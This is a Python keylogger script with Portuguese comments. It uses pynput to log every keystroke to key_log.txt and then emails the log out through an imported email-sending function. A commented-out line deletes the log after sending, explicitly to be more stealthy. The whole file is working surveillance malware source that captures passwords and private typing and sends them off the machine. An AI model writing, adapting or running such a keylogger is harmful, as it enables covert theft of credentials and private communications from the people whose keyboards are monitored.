# keylogger.py
# Script para capturar teclas e salvar em um arquivo de log

from pynput.keyboard import Key, Listener
import logging
import os
from .email_sender import enviar_log_por_email # Importação relativa

# Define o nome do arquivo de log
log_file = "key_log.txt"

# Configura o logging para salvar as teclas no arquivo
# format='%(message)s' garante que apenas a tecla seja salva, sem data/hora.
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')

def on_press(key):
    """
    Esta função é chamada toda vez que uma tecla é pressionada.
    """
    try:
        # Tenta registrar o caractere da tecla (ex: 'a', 'b', 'c')
        logging.info(key.char)
    except AttributeError:
        # Se não for um caractere (ex: Shift, Ctrl, Espaço), formata e registra
        if key == Key.space:
            # Registra um espaço em vez de '[Key.space]'
            logging.info(' ')
        elif key == Key.enter:
            # Registra uma nova linha para a tecla Enter
            logging.info('\n')
        else:
            # Para outras teclas especiais, registra seu nome entre colchetes
            # Ex: [shift], [ctrl_l], [esc]
            logging.info(f' [{str(key).replace("Key.", "")}] ')

def on_release(key):
    """
    Esta função é chamada quando uma tecla é liberada.
    """
    # Se a tecla 'Esc' for liberada, o programa para.
    if key == Key.esc:
        return False

if __name__ == '__main__':
    print("Keylogger iniciado. Pressione 'Esc' para parar.")
    # Inicia o 'ouvinte' do teclado
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Quando o listener parar (após pressionar Esc), envia o e-mail
    print("Keylogger parado. Enviando log por e-mail...")
    enviar_log_por_email(log_file)
    
    # Opcional: remover o log após o envio para ser mais furtivo
    # os.remove(log_file)
    print("Processo finalizado.")
